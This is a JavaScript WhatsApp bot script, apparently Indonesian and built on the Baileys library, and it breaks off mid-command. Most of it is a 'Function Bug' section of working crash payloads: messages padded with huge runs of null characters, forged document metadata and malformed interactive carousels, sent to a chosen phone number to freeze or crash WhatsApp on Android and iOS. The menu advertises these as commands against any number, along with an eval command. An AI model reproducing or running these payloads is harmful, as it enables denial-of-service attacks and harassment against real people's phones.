require('./setting/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const kripto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = zyn = async (zyn, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? zyn.user.id.split(":")[0] || zyn.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./message/lib/database/owner.json'));

const botNumber = await zyn.decodeJid(zyn.user.id);
const isBot = botNumber.includes(senderNumber)
const isAcces = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await zyn.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Media
const ZynMg = fs.readFileSync('./message/lib/media/ZynMg.jpg');

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl')

// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ JinZo Message`));
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
` ⌬ Pesan: ${m.body || m.mtype} \n` +
` ⌬ Pengirim: ${m.pushname} \n` +
` ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Grup: ${groupName} \n` +
` ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

// Function Bug
    const NullNihBos = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ZynXzo",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
    async function SendPairing(target, Ptcp = true) {
			await zyn.relayMessage(target, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
};
    
    async function FloodsCarousel2(target, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://files.catbox.moe/uk38k6.jpg" } },
          { upload: zyn.waUploadToServer }
        )),
        title: "𝗝𝗶𝗻𝗭𝗼 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 ϟ" + "\u0000".repeat(100000),
        subtitle: "𝐙𝐲𝐧𝐗𝐳𝐨 𝐊𝐢𝐥𝐥⃟⃟",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0000" + "\u0000".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: " 𝗝𝗶𝗻𝗫𝘇𝗼 ϟ ",
            rows: [
              {
                title: " ϟ 𝐙𝐲𝐧𝐗𝐳𝐨 𝐊𝐢𝐥𝐥 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
          {
            title: " 𝗝𝗶𝗻𝗫𝘇𝗼 ϟ ",
            rows: [
              {
                title: " ϟ 𝐙𝐲𝐧𝐗𝐳𝐨 𝐊𝐢𝐥𝐥 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
        ],
      };

      await zyn.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
                quoted: NullNihBos
              },
            }
          : {}
      );
    }
    
    async function IosMJ(target, Ptcp = false) {
      await zyn.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "ZYNXZO - CALL" + "\u0000".repeat(50000),
                body: "𝐉𝐢𝐧𝐙𝐨 𝐊𝐢𝐥𝐥⃟⃟" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/Zyn_Xzo",
                mediaUrl: "https://t.me/Zyn_Xzo",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/Zyn_Xzo",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    async function XiosVirus(target) {
      zyn.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝐉𝐢𝐧𝐙𝐨 𝐊𝐢𝐥𝐥⃟⃟ -` + "࣯\u0000".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐉𝐢𝐧𝐙𝐨 𝐊𝐢𝐥𝐥⃟⃟" + "\u0000".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
            quoted: NullNihBos
          },
        },
        {
          messageId: null,
        }
      );
    }

      async function BlankScreen(target, Ptcp = false) {
        let virtex = "⚔️ 𝗦𝗬𝗦𝗧𝗘𝗠" + "\u0000".repeat(90000);
			await zyn.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "ZynXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : { quoted: NullNihBos }
			);
       }
       
    async function FloodsCarousel(target, NullNihBos, Ptcp = true) {
      const header = {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
        },
        hasMediaAttachment: true,
      };

      const body = {
        text: "iOS FC" + "\u0000".repeat(90000),
      };

      const carouselMessage = {
        sections: [
          {
            title: " ϟ ",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
          {
            title: "Section 2",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
        ],
      };

      await zyn.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp ? { participant: { jid: target } } : { quoted: NullNihBos }
      );

      console.log(chalk.blue.bold("Carousel Active : Start Processing Crash!"));
    }

    // End Function Bug //
    
    async function ComBox(target) {
      {
        await XiosVirus(target);
        await IosMJ(target, Ptcp = true);
        await FloodsCarousel2(target, Ptcp = true);
        await FloodsCarousel(target, Ptcp = true);
        await BlankScreen(target, Ptcp = true);
      }
    }

    async function FrezeiOS(target) {
      {
        await XiosVirus(target)
        await FloodsCarousel(target, Ptcp = true)
        await IosMJ(target, Ptcp = true)
      }
    }

// Helper functions
async function replygw(txt) {
const wwk = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: 'ZynXzo Script',
newsletterJid: '120363365398682521@newsletter',
},
externalAdreply: {
showAdAttribution: true,
title: 'ZynXzo Bot',
body: 'JinXzo',
thumbnailUrl: 'https://files.catbox.moe/uk38k6.jpg',
sourceUrl: 'https://t.me/Zynn_Xzoo',
},
},
text: txt,
}
zyn.sendMessage(from, wwk, {
quoted: m,
})
}

const reaction = async (jidss, emoji) => {
zyn.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// Command handler
switch (command) {

case 'menu': {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
let JinZo = `𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : JinXzo
𝗦𝘁𝗮𝘁𝘂𝘀 : ${isAcces ? "Vip" : "Free"}
𝗩𝗲𝗿𝘀𝗶 : 14.5 News
𝗧𝘆𝗽𝗲 : Case

⧎  〈 𝗡𝗢𝗥𝗠𝗔𝗟 〉
> v-andro ↯ number
> v-ios ↯ number
> vandro ↯ pribadi
> vios ↯ pribadi

⧎  〈 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 〉
> x-andro ↯ number
> x-ios ↯ number
> xandro ↯ pribadi
> xios ↯ pribadi

⧎  〈 𝗔𝗖𝗖𝗘𝗦 〉
> addacces ↯ number
> dellacces ↯ number

⧎  〈 𝗦𝗘𝗧𝗧𝗜𝗡𝗚 〉
> fixbug ↯ number
> pub ↯ public
> self ↯ private
> eval ↯ reply

⧎  〈 𝗖𝗿𝗲𝗱𝗶𝘁 𝗦𝗰𝗿𝗶𝗽𝘁 〉
> 𝘚𝘤𝘳𝘪𝘱𝘵 𝘪𝘯𝘪 𝘥𝘪𝘣𝘶𝘢𝘵 𝘰𝘭𝘦𝘩 𝘡𝘺𝘯𝘟𝘻𝘰, 𝘫𝘪𝘬𝘢 𝘪𝘯𝘨𝘪𝘯 𝘮𝘦𝘮𝘣𝘦𝘭𝘪 𝘴𝘤𝘳𝘪𝘱𝘵, 𝘴𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘩𝘶𝘣𝘶𝘯𝘨𝘪 𝘥𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳
> 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 : t.me/ZynXzoV2`
zyn.sendMessage(from, { video: { url: `https://files.catbox.moe/vbblzg.mp4` },
caption: JinZo,
gifPlayback: true,
}, { quoted: m });
}
break

case 'fixbug': {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
for (let i = 0; i < 3; i++) {
await zyn.sendMessage(target, {text: "𝗨𝗡𝗟𝗢𝗖𝗞 𝗕𝗨𝗚 ( 𝐁𝐘 𝐙𝐘𝐍𝐗𝐙𝐎 )\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝗨𝗡𝗟𝗢𝗖𝗞 